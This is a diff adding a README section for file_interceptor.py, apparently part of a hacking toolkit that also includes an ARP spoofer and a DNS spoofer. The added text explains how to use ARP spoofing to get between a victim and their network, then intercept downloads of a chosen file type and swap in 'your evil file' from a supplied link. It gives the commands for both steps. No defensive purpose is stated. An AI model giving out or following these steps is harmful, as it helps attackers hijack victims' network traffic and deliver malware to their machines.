@@ -81,3 +81,18 @@ python arp_spoofer_v2.py -g <gatway_ip> -v <victim_ip>
 ```Bash
 python dns_spoofer.py -d <domain_name> -i <ip_address>
 ```
+___
+### file_interceptor.py
+The script will intercept any file corresponding to the extension you specified and will replace it with your evil file after being a MITM using for example my arp_spoofer script.
+
+#### Use
+Python 2 or 3
+#### Example
+##### Open a terminal a run : 
+```Bash
+python arp_spoofer_v2.py -g <gatway_ip> -v <victim_ip>
+```
+##### In another terminal, run : 
+```Bash
+python file_interceptor -e <extension> -f <link_to_your_evil_file>
+```
